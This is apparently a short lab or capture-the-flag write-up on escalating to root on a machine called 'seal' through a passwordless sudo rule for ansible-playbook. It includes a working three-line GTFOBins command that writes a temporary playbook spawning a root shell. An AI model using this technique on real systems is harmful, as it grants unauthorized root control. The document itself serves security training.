# Privilege escalation to root
## Running `sudo -l` tells that `User luis may run the following commands on seal: (ALL) NOPASSWD: /usr/bin/ansible-playbook *` as sudo
Running `sudo -l` tells that `User luis may run the following commands on seal: (ALL) NOPASSWD: /usr/bin/ansible-playbook *` as sudo. 
## We can use [GTFObins](https://gtfobins.github.io/gtfobins/ansible-playbook/#shell) to privilege escalate to root
We can run following command from [GTFObins](https://gtfobins.github.io/gtfobins/ansible-playbook/#shell) to get root shell.
```bash
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF
```
![[Pasted image 20210928115744.png]]

